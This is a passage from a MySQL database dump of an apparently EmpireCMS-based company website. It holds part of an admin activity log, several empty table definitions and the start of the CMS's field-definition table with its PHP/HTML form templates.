16:35:37','admin','DelFcListClass','---',0,'51229'),(912,'110.185.38.87','2020-05-12 16:40:23','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'51651'),(913,'110.185.38.87','2020-05-12 16:40:50','admin','ReListHtml_all','---',0,'51723'),(914,'110.185.38.87','2020-05-12 16:40:55','admin','ChangeEnewsData','---',0,'51723'),(915,'110.185.38.87','2020-05-12 16:40:58','admin','ReClassPath','---',0,'51723'),(916,'110.185.38.87','2020-05-12 16:41:01','admin','DelFcListClass','---',0,'51723'),(917,'110.185.38.87','2020-05-12 16:43:04','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'51896'),(918,'110.185.38.87','2020-05-12 16:43:24','admin','ReListHtml_all','---',0,'64099'),(919,'110.185.38.87','2020-05-12 16:43:27','admin','ReIndex','---',0,'64099'),(920,'110.185.38.87','2020-05-12 16:43:30','admin','ChangeEnewsData','---',0,'64099'),(921,'110.185.38.87','2020-05-12 16:45:45','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'52167'),(922,'110.185.38.87','2020-05-12 16:45:55','admin','ReListHtml_all','---',0,'52174'),(923,'110.185.38.87','2020-05-12 16:45:58','admin','ChangeEnewsData','---',0,'52167'),(924,'110.185.38.87','2020-05-12 16:46:02','admin','ReClassPath','---',0,'52167'),(925,'110.185.38.87','2020-05-12 16:46:06','admin','DelFcListClass','---',0,'52167'),(926,'110.185.38.87','2020-05-12 17:29:02','admin','login','---',0,'54704'),(927,'110.185.38.87','2020-05-13 10:35:33','admin','login','---',0,'29547'),(928,'110.185.38.87','2020-05-13 17:03:10','admin','login','---',0,'55908'),(929,'110.185.38.87','2020-05-13 17:10:51','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'56080'),(930,'110.185.38.87','2020-05-13 17:16:04','admin','ReListHtml_all','---',0,'1559'),(931,'110.185.38.87','2020-05-13 17:16:10','admin','ChangeEnewsData','---',0,'1557'),(932,'110.185.38.87','2020-05-13 17:16:14','admin','ReClassPath','---',0,'1557'),(933,'110.185.38.87','2020-05-13 17:16:19','admin','DelFcListClass','---',0,'1557'),(934,'110.185.38.87','2020-05-13 17:16:30','admin','UpdateClassInfosAll','---',0,'1557'),(935,'110.185.38.87','2020-05-13 17:16:36','admin','ReIndex','---',0,'1557'),(936,'110.185.38.87','2020-05-13 17:49:58','admin','login','---',0,'57442'),(937,'110.185.38.87','2020-05-14 11:25:55','admin','login','---',0,'26399'),(938,'110.185.38.87','2020-05-14 11:26:13','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'52574'),(939,'110.185.38.87','2020-05-14 11:26:24','admin','EditNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'26427'),(940,'110.185.38.87','2020-05-14 11:26:28','admin','ReIndex','---',0,'26427'),(941,'110.185.38.87','2020-05-14 11:26:34','admin','ReListHtml_all','---',0,'26427'),(942,'110.185.38.87','2020-05-14 11:27:07','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'52616'),(943,'110.185.38.87','2020-05-14 11:27:17','admin','EditNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'52616'),(944,'110.185.38.87','2020-05-14 11:27:28','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'26605'),(945,'110.185.38.87','2020-05-14 11:28:30','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'26681'),(946,'110.185.38.87','2020-05-14 11:28:38','admin','ReSingleInfo','classid=18',0,'26685'),(947,'110.185.38.87','2020-05-14 11:28:54','admin','ChangeEnewsData','---',0,'26695'),(948,'110.185.38.87','2020-05-14 11:29:14','admin','EditNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'26725'),(949,'110.185.38.87','2020-05-14 11:29:25','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'26725'),(950,'110.185.38.87','2020-05-14 11:29:35','admin','EditNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'26725'),(951,'110.185.38.87','2020-05-14 11:30:49','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'52740'),(952,'110.185.38.87','2020-05-14 11:31:52','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'26889'),(953,'110.185.38.87','2020-05-14 11:33:11','admin','EditNews','classid=18<br>id=166<br>title=四川兴德红油厂区环氧自流平案例',1000010000000166,'52910'),(954,'110.185.38.87','2020-05-14 11:33:29','admin','EditNews','classid=18<br>id=165<br>title=遂宁金海国际车库案例',1000010000000165,'52928'),(955,'110.185.38.87','2020-05-14 11:33:40','admin','ReIndex','---',0,'52932'),(956,'110.185.38.87','2020-05-14 11:34:46','admin','ReListHtml_all','---',0,'53022'),(957,'110.185.38.87','2020-05-18 14:14:15','admin','login','---',0,'63767'),(958,'110.185.38.87','2020-05-18 14:18:51','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'64067'),(959,'110.185.38.87','2020-05-18 14:19:00','admin','ReListHtml_all','---',0,'64076'),(960,'110.185.38.87','2020-05-18 14:19:09','admin','ChangeEnewsData','---',0,'64076'),(961,'110.185.38.87','2020-05-18 14:19:11','admin','ReClassPath','---',0,'64076'),(962,'110.185.38.87','2020-05-18 14:19:13','admin','DelFcListClass','---',0,'64076'),(963,'110.185.38.87','2020-05-18 14:23:58','admin','ReListHtml','---',0,'64384'),(964,'110.185.38.87','2020-05-18 14:26:33','admin','EditNewstemp','tempid=3<br>tempname=公司简介内容模板&amp;gid=1',0,'64545'),(965,'110.185.38.87','2020-05-18 14:27:20','admin','AddNewstemp','tempid=11<br>tempname=企业文化内容模板&amp;gid=1',0,'64591'),(966,'110.185.38.87','2020-05-18 14:28:28','admin','AddNewstemp','tempid=12<br>tempname=公司风采内容模板&amp;gid=1',0,'64674'),(967,'110.185.38.87','2020-05-18 14:29:04','admin','EditClass','classid=13<br>classname=企业文化',0,'64703'),(968,'110.185.38.87','2020-05-18 14:29:17','admin','EditClass','classid=14<br>classname=公司风采',0,'64724'),(969,'110.185.38.87','2020-05-18 15:06:56','admin','EditNewstemp','tempid=1<br>tempname=新闻内容模板&amp;gid=1',0,'50900'),(970,'110.185.38.87','2020-05-18 15:07:20','admin','ChangeEnewsData','---',0,'50925'),(971,'110.185.38.87','2020-05-18 15:07:23','admin','ReClassPath','---',0,'50925'),(972,'110.185.38.87','2020-05-18 15:07:25','admin','DelFcListClass','---',0,'50925'),(973,'110.185.38.87','2020-05-18 15:57:45','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'54127'),(974,'110.185.38.87','2020-05-18 15:57:53','admin','EditNewstemp','tempid=2<br>tempname=产品内容模板&amp;gid=1',0,'54120'),(975,'110.185.38.87','2020-05-19 10:23:46','admin','login','---',0,'55675'),(976,'110.185.38.87','2020-05-19 10:27:32','admin','EditNewstemp','tempid=10<br>tempname=联系我们内容模板&amp;gid=1',0,'51787'),(977,'110.185.38.87','2020-05-19 10:31:13','admin','login','---',0,'63916'),(978,'110.185.38.87','2020-05-19 10:31:50','admin','EditNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'63956'),(979,'110.185.38.87','2020-05-20 17:27:09','admin','login','---',0,'55557'),(980,'171.213.29.24','2020-06-30 10:17:21','admin','login','---',0,'33246'),(981,'171.213.29.24','2020-06-30 10:18:26','admin','EditNews','classid=6<br>id=4<br>title=联系我们',1000010000000004,'29783'),(982,'171.213.29.24','2020-06-30 10:19:40','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'30242'),(983,'171.213.29.24','2020-06-30 10:20:14','admin','ReIndex','---',0,'30333'),(984,'171.213.29.24','2020-06-30 10:21:45','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'31129'),(985,'171.213.29.24','2020-06-30 10:23:49','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'32051'),(986,'171.213.29.24','2020-06-30 10:23:51','admin','ReIndex','---',0,'32051'),(987,'171.213.29.24','2020-06-30 10:25:06','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'32389'),(988,'171.213.29.24','2020-06-30 10:25:09','admin','ReIndex','---',0,'32389'),(989,'220.166.231.88','2020-07-01 11:46:13','admin','login','---',0,'34558'),(990,'220.166.231.88','2020-07-01 11:46:56','admin','RepTemp','gid=1',0,'34682'),(991,'220.166.231.88','2020-07-01 11:47:05','admin','ReListHtml_all','---',0,'34720'),(992,'220.166.231.88','2020-07-01 11:47:06','admin','ReIndex','---',0,'34720'),(993,'220.166.228.198','2020-09-21 10:32:46','admin','login','---',0,'23268'),(994,'220.166.228.198','2020-09-21 10:33:09','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'23524'),(995,'220.166.228.198','2020-09-21 10:33:12','admin','ReIndex','---',0,'23539'),(996,'220.166.228.198','2020-09-21 10:34:58','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'24304'),(997,'220.166.228.198','2020-09-21 10:35:00','admin','ReIndex','---',0,'24304'),(998,'220.166.228.198','2020-09-21 10:36:30','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'24805'),(999,'220.166.228.198','2020-09-21 10:36:33','admin','ReIndex','---',0,'24805'),(1000,'220.166.228.198','2020-09-21 10:37:03','admin','EditPublicTemp','gid=1',0,'24966'),(1001,'220.166.228.198','2020-09-21 10:37:05','admin','ReIndex','---',0,'24966'),(1002,'47.113.225.249','2020-11-16 16:46:45','admin','login','---',0,'58511'),(1003,'47.113.225.249','2020-11-18 15:51:30','admin','login','---',0,'58487'),(1004,'47.113.225.249','2020-11-19 23:01:42','admin','login','---',0,'63220'),(1005,'202.62.112.39','2020-11-20 20:19:41','admin','login','---',0,'1170'),(1006,'202.62.112.39','2020-11-20 20:19:59','admin','AddIndexpage','tempid=1&amp;tempname=343434',0,'11254'),(1007,'47.113.225.249','2020-11-23 17:20:24','admin','login','---',0,'56847'),(1008,'47.113.225.249','2020-11-24 19:02:25','admin','login','---',0,'59895'),(1009,'39.98.49.33','2020-11-25 18:42:27','admin','login','---',0,'55088'),(1010,'47.113.225.249','2020-11-28 17:19:17','admin','login','---',0,'62618'),(1011,'220.166.229.153','2021-01-06 14:06:14','admin','login','---',0,'56549'),(1012,'220.166.229.153','2021-01-06 14:06:51','admin','EditTempvar','varid=2<br>var=footer&amp;gid=1',0,'56744'),(1013,'220.166.229.153','2021-01-06 14:06:58','admin','ReIndex','---',0,'56772'),(1014,'220.166.228.174','2022-03-04 11:02:30','admin','login','---',0,'54998'),(1015,'220.166.228.174','2022-03-04 11:24:46','admin','login','---',0,'57075'),(1016,'220.166.228.174','2022-03-04 13:14:29','admin','login','---',0,'57991'),(1017,'220.166.228.174','2022-03-04 13:14:51','admin','ChangeEnewsData','---',0,'58047'),(1018,'220.166.228.174','2022-03-04 13:14:53','admin','ReClassPath','---',0,'58047'),(1019,'220.166.228.174','2022-03-04 13:14:58','admin','ReDtPage','---',0,'58047'),(1020,'220.166.228.174','2022-03-04 13:15:03','admin','ChangeAllModForm','ChangeClass=1',0,'58047'),(1021,'220.166.228.174','2022-03-04 13:15:08','admin','ReUserlistAll','---',0,'58110'),(1022,'220.166.228.174','2022-03-04 13:16:11','admin','AddClass','classid=27<br>classname=合作伙伴(1)',0,'54284'),(1023,'220.166.228.174','2022-03-04 13:16:22','admin','DelClass','classid=27<br>classname=合作伙伴(1)',0,'54420'),(1024,'220.166.228.174','2022-03-04 13:16:50','admin','AddNews','classid=20<br>id=178<br>title=8',1000010000000178,'54595'),(1025,'220.166.228.174','2022-03-04 14:08:20','admin','EditNews','classid=20<br>id=178<br>title=荣誉8',1000010000000178,'57324'),(1026,'220.166.228.174','2022-03-04 14:19:55','admin','EditNews','classid=20<br>id=178<br>title=荣誉8',1000010000000178,'56178'),(1027,'220.166.228.174','2022-03-04 14:20:18','admin','AddNews','classid=20<br>id=179<br>title=荣誉9',1000010000000179,'56200'),(1028,'220.166.228.174','2022-03-04 14:20:36','admin','AddNews','classid=20<br>id=180<br>title=荣誉10',1000010000000180,'56319'),(1029,'220.166.228.174','2022-03-04 14:21:23','admin','AddNews','classid=20<br>id=181<br>title=荣誉11',1000010000000181,'56420'),(1030,'220.166.228.174','2022-03-04 14:21:40','admin','AddNews','classid=20<br>id=182<br>title=荣誉12',1000010000000182,'56533'),(1031,'220.166.228.174','2022-03-04 14:21:56','admin','AddNews','classid=20<br>id=183<br>title=荣誉13',1000010000000183,'56533'),(1032,'220.166.228.174','2022-03-04 14:22:32','admin','ReIndex','---',0,'56876'),(1033,'220.166.228.174','2022-03-04 14:22:33','admin','ReListHtml_all','---',0,'56878'),(1034,'220.166.228.174','2022-03-04 14:23:57','admin','EditNews','classid=20<br>id=178<br>title=资质1',1000010000000178,'57371'),(1035,'220.166.228.174','2022-03-04 14:24:07','admin','EditNews','classid=20<br>id=179<br>title=资质2',1000010000000179,'57381'),(1036,'220.166.228.174','2022-03-04 14:24:14','admin','EditNews','classid=20<br>id=180<br>title=资质3',1000010000000180,'57393'),(1037,'220.166.228.174','2022-03-04 14:24:21','admin','EditNews','classid=20<br>id=181<br>title=资质4',1000010000000181,'57403'),(1038,'220.166.228.174','2022-03-04 14:24:27','admin','EditNews','classid=20<br>id=182<br>title=资质5',1000010000000182,'57416'),(1039,'220.166.228.174','2022-03-04 14:24:32','admin','EditNews','classid=20<br>id=183<br>title=资质6',1000010000000183,'57424'),(1040,'220.166.228.174','2022-03-04 14:24:38','admin','ReIndex','---',0,'57424'),(1041,'220.166.228.174','2022-03-04 14:24:40','admin','ReListHtml_all','---',0,'57481'),(1042,'220.166.228.174','2022-03-04 14:37:13','admin','login','---',0,'55791'),(1043,'220.166.228.81','2022-04-14 11:28:15','admin','login','---',0,'22053'),(1044,'220.166.228.81','2022-04-14 11:28:57','admin','login','---',0,'22668'),(1045,'220.166.228.81','2022-04-14 11:30:53','admin','login','---',0,'23498'),(1046,'171.214.217.147','2022-04-14 11:31:26','admin','login','---',0,'25225');
/*!40000 ALTER TABLE `libang_enewsdolog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsdownerror`
--

DROP TABLE IF EXISTS `libang_enewsdownerror`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsdownerror` (
  `errorid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `errortext` varchar(255) NOT NULL DEFAULT '',
  `errortime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `errorip` varchar(20) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`errorid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsdownerror`
--

LOCK TABLES `libang_enewsdownerror` WRITE;
/*!40000 ALTER TABLE `libang_enewsdownerror` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsdownerror` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsdownrecord`
--

DROP TABLE IF EXISTS `libang_enewsdownrecord`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsdownrecord` (
  `id` int(11) NOT NULL DEFAULT '0',
  `pathid` int(11) NOT NULL DEFAULT '0',
  `userid` int(11) NOT NULL DEFAULT '0',
  `username` varchar(30) NOT NULL DEFAULT '',
  `title` varchar(120) NOT NULL DEFAULT '',
  `cardfen` int(11) NOT NULL DEFAULT '0',
  `truetime` int(11) NOT NULL DEFAULT '0',
  `classid` smallint(6) NOT NULL DEFAULT '0',
  `online` tinyint(1) NOT NULL DEFAULT '0',
  KEY `userid` (`userid`),
  KEY `truetime` (`truetime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsdownrecord`
--

LOCK TABLES `libang_enewsdownrecord` WRITE;
/*!40000 ALTER TABLE `libang_enewsdownrecord` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsdownrecord` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsdownurlqz`
--

DROP TABLE IF EXISTS `libang_enewsdownurlqz`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsdownurlqz` (
  `urlid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `urlname` varchar(30) NOT NULL DEFAULT '',
  `url` varchar(255) NOT NULL DEFAULT '',
  `downtype` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`urlid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsdownurlqz`
--

LOCK TABLES `libang_enewsdownurlqz` WRITE;
/*!40000 ALTER TABLE `libang_enewsdownurlqz` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsdownurlqz` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewserrorclass`
--

DROP TABLE IF EXISTS `libang_enewserrorclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewserrorclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewserrorclass`
--

LOCK TABLES `libang_enewserrorclass` WRITE;
/*!40000 ALTER TABLE `libang_enewserrorclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewserrorclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsf`
--

DROP TABLE IF EXISTS `libang_enewsf`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsf` (
  `fid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `f` varchar(30) NOT NULL DEFAULT '',
  `fname` varchar(30) NOT NULL DEFAULT '',
  `fform` varchar(20) NOT NULL DEFAULT '',
  `fhtml` mediumtext NOT NULL,
  `fzs` varchar(255) NOT NULL DEFAULT '',
  `isadd` tinyint(1) NOT NULL DEFAULT '0',
  `isshow` tinyint(1) NOT NULL DEFAULT '0',
  `iscj` tinyint(1) NOT NULL DEFAULT '0',
  `cjhtml` mediumtext NOT NULL,
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  `ftype` varchar(30) NOT NULL DEFAULT '',
  `flen` varchar(20) NOT NULL DEFAULT '',
  `dotemp` tinyint(1) NOT NULL DEFAULT '0',
  `tid` smallint(6) NOT NULL DEFAULT '0',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `savetxt` tinyint(1) NOT NULL DEFAULT '0',
  `fvalue` text NOT NULL,
  `iskey` tinyint(1) NOT NULL DEFAULT '0',
  `tobr` tinyint(1) NOT NULL DEFAULT '0',
  `dohtml` tinyint(1) NOT NULL DEFAULT '0',
  `qfhtml` mediumtext NOT NULL,
  `isonly` tinyint(1) NOT NULL DEFAULT '0',
  `linkfieldval` varchar(30) NOT NULL DEFAULT '',
  `samedata` tinyint(1) NOT NULL DEFAULT '0',
  `fformsize` varchar(12) NOT NULL DEFAULT '',
  `tbdataf` tinyint(1) NOT NULL DEFAULT '0',
  `ispage` tinyint(1) NOT NULL DEFAULT '0',
  `adddofun` varchar(255) NOT NULL DEFAULT '',
  `editdofun` varchar(255) NOT NULL DEFAULT '',
  `qadddofun` varchar(255) NOT NULL DEFAULT '',
  `qeditdofun` varchar(255) NOT NULL DEFAULT '',
  `linkfieldtb` varchar(60) NOT NULL DEFAULT '',
  `linkfieldshow` varchar(30) NOT NULL DEFAULT '',
  `editorys` tinyint(1) NOT NULL DEFAULT '0',
  `issmalltext` tinyint(1) NOT NULL DEFAULT '0',
  `fmvnum` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`fid`),
  KEY `tid` (`tid`)
) ENGINE=MyISAM AUTO_INCREMENT=107 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsf`
--

LOCK TABLES `libang_enewsf` WRITE;
/*!40000 ALTER TABLE `libang_enewsf` DISABLE KEYS */;
INSERT INTO `libang_enewsf` VALUES (1,'title','标题','text','<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#DBEAF5\\\">\r\n<tr> \r\n  <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">\r\n	<?=$tts?\\\"<select name=\\\'ttid\\\'><option value=\\\'0\\\'>标题分类</option>$tts</select>\\\":\\\"\\\"?>\r\n	<input type=text name=title value=\\\"<?=ehtmlspecialchars(stripSlashes($r[title]))?>\\\" size=\\\"60\\\"> \r\n	<input type=\\\"button\\\" name=\\\"button\\\" value=\\\"图文\\\" onclick=\\\"document.add.title.value=document.add.title.value+\\\'(图文)\\\';\\\"> \r\n  </td>\r\n</tr>\r\n<tr> \r\n  <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">属性: \r\n	<input name=\\\"titlefont[b]\\\" type=\\\"checkbox\\\" value=\\\"b\\\"<?=$titlefontb?>>粗体\r\n	<input name=\\\"titlefont[i]\\\" type=\\\"checkbox\\\" value=\\\"i\\\"<?=$titlefonti?>>斜体\r\n	<input name=\\\"titlefont[s]\\\" type=\\\"checkbox\\\" value=\\\"s\\\"<?=$titlefonts?>>删除线\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;颜色: <input name=\\\"titlecolor\\\" type=\\\"text\\\" value=\\\"<?=stripSlashes($r[titlecolor])?>\\\" size=\\\"10\\\" class=\\\"color\\\">\r\n  </td>\r\n</tr>\r\n</table>','标题',0,1,1,'  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--title--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_title]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_title]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_title]\" type=\"text\" id=\"add[z_title]\" value=\"<?=stripSlashes($r[z_title])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>',0,'CHAR','100',1,1,'news',0,'',0,0,0,'<input name=\\\"title\\\" type=\\\"text\\\" size=\\\"42\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":DoReqValue($mid,\\\'title\\\',stripSlashes($r[title]))?>\\\">',0,'',0,'60',0,0,'','','','','','',0,0,''),(2,'special.field','特殊属性','','<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#DBEAF5\\\">\r\n  <tr>\r\n    <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">信息属性: \r\n      <input name=\\\"checked\\\" type=\\\"checkbox\\\" value=\\\"1\\\"<?=$r[checked]?\\\' checked\\\':\\\'\\\'?>>\r\n      审核 &nbsp;&nbsp; 推荐 \r\n      <select name=\\\"isgood\\\" id=\\\"isgood\\\">\r\n        <option value=\\\"0\\\">不推荐</option>\r\n	<?=$ftnr[\\\'igname\\\']?>\r\n      </select>\r\n      &nbsp;&nbsp; 头条 \r\n      <select name=\\\"firsttitle\\\" id=\\\"firsttitle\\\">\r\n        <option value=\\\"0\\\">非头条</option>\r\n	<?=$ftnr[\\\'ftname\\\']?>\r\n      </select></td>\r\n  </tr>\r\n  <tr> \r\n    <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">关键字&nbsp;&nbsp;&nbsp;: \r\n      <input name=\\\"keyboard\\\" type=\\\"text\\\" size=\\\"52\\\" value=\\\"<?=stripSlashes($r[keyboard])?>\\\">\r\n      <font color=\\\"#666666\\\">(多个请用&quot;,&quot;隔开)</font></td>\r\n  </tr>\r\n  <tr> \r\n    <td height=\\\"25\\\" bgcolor=\\\"#FFFFFF\\\">外部链接: \r\n      <input name=\\\"titleurl\\\" type=\\\"text\\\" value=\\\"<?=stripSlashes($r[titleurl])?>\\\" size=\\\"52\\\">\r\n      <font color=\\\"#666666\\\">(填写后信息连接地址将为此链接)</font></td>\r\n  </tr>\r\n</table>','特殊属性',0,1,0,'',1,'','',0,1,'news',0,'',0,0,0,'<input name=\\\"keyboard\\\" type=\\\"text\\\" size=42 value=\\\"<?=stripSlashes($r[keyboard])?>\\\">\r\n<font color=\\\"#666666\\\">(多个请用&quot;,&quot;隔开)</font>',0,'',0,'',0,0,'','','','','','',0,0,''),(3,'titlepic','标题图片','img','<input name=\\\"titlepic\\\" type=\\\"text\\\" id=\\\"titlepic\\\" value=\\\"<?=$ecmsfirstpost==1?\\\"\\\":ehtmlspecialchars(stripSlashes($r[titlepic]))?>\\\" size=\\\"45\\\">\r\n<a onclick=\\\"window.open(\\\'ecmseditor/FileMain.php?type=1&classid=<?=$classid?>&infoid=<?=$id?>&filepass=<?=$filepass?>&sinfo=1&doing=1&field=titlepic<?=$ecms_hashur[ehref]?>\\\',\\\'\\\',\\\'width=700,height=550,scrollbars=yes\\\');\\\" title=\\\"选择已上传的图片\\\"><img src=\\\"../data/images/changeimg.gif\\\" border=\\\"0\\\" align=\\\"absbottom\\\"></a>','标题图片',0,1,1,'  <tr bgcolor=\\\"#FFFFFF\\\"> \r\n    <td height=\\\"22\\\" valign=\\\"top\\\"><strong>[!--enews.name--]正则：</strong><br>\r\n      ( \r\n      <input name=\\\"textfield\\\" type=\\\"text\\\" id=\\\"textfield\\\" value=\\\"[!--titlepic--]\\\" size=\\\"20\\\">\r\n      )</td>\r\n    <td><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"1\\\" cellpadding=\\\"3\\\">\r\n    <tr>\r\n      <td>附件前缀 \r\n        <input name=\\\"add[qz_titlepic]\\\" type=\\\"text\\\" id=\\\"add[qz_titlepic]\\\" value=\\\"<?=stripSlashes($r[qz_titlepic])?>\\\"> \r\n        <input name=\\\"add[save_titlepic]\\\" type=\\\"checkbox\\\" id=\\\"add[save_titlepic]\\\" value=\\\" checked\\\"<?=$r[save_titlepic]?>>\r\n        远程保存 </td>\r\n    </tr>\r\n    <tr> \r\n      <td><textarea name=\\\"add[zz_titlepic]\\\" cols=\\\"60\\\" rows=\\\"10\\\" id=\\\"add[zz_titlepic]\\\"><?=ehtmlspecialchars(stripSlashes($r[zz_titlepic]))?></textarea></td>\r\n    </tr>\r\n    <tr> \r\n      <td><input name=\\\"add[z_titlepic]\\\" type=\\\"text\\\" id=\\\"titlepic5\\\" value=\\\"<?=stripSlashes($r[z_titlepic])?>\\\">\r\n        (如填写这里，这就是字段的值)</td>\r\n    </tr>\r\n  </table></td>\r\n  </tr>\r\n',2,'CHAR','120',1,1,'news',0,'',0,0,0,'<input type=\\\"file\\\" name=\\\"titlepicfile\\\" size=\\\"45\\\">',0,'',0,'60',0,0,'','','','','','',0,0,''),(4,'newstime','发布时间','text','<input name=\\\"newstime\\\" type=\\\"text\\\" value=\\\"<?=$r[newstime]?>\\\" size=\\\"28\\\" class=\\\"Wdate\\\" onClick=\\\"WdatePicker({skin:\\\'default\\\',dateFmt:\\\'yyyy-MM-dd HH:mm:ss\\\'})\\\"><input type=button name=button value=\\\"设为当前时间\\\" onclick=\\\"document.add.newstime.value=\\\'<?=$todaytime?>\\\'\\\">','发布时间',0,1,1,'  <tr bgcolor=\"#FFFFFF\"> \r\n    <td height=\"22\" valign=\"top\"><strong>[!--enews.name--]正则：</strong><br>\r\n      (<input name=\"textfield\" type=\"text\" id=\"textfield\" value=\"[!--newstime--]\" size=\"20\">)</td>\r\n    <td><table width=\"100%\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\">\r\n        <tr> \r\n          <td><textarea name=\"add[zz_newstime]\" cols=\"60\" rows=\"10\" id=\"textarea\"><?=ehtmlspecialchars(stripSlashes($r[zz_newstime]))?></textarea></td>\r\n        </tr>\r\n        <tr> \r\n          <td><input name=\"add[z_newstime]\" type=\"text\" id=\"add[z_newstime]\" value=\"<?=stripSlashes($r[z_newstime])?>\">\r\n            (如填写这里，将为字段的值)</td>\r\n        </tr>\r\n      </table></td>\r\n  </tr>',1,'INT','11',1,1,'news',0,'',1,0,0,'',0,'',0,'',0,0,'','','','','','',0,0,''),(5,'ftitle','副标题','text','<input name=\\\"ftitle\\\" type=\\\"text\\\" size=60 id=\\\"ftitle\\\" 